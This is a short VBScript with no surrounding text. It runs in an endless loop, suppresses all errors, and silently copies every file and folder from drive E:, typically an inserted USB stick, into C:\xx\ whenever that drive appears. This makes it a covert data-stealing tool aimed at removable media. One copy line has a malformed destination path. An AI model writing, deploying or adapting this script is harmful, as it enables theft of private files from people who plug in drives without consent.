set fso=createobject("scripting.filesystemobject") 
set ws=createobject("wscript.shell")
on error resume next
do
wscript.sleep 10
if fso.driveexists("E:\") then
fso.copyfolder "E:\*","C:\xx\"
fso.copyfile "E:\*",":C:\xx\"
fso.copyfolder "E:\*","C:\xx\"
wscript.sleep 20
end if
loop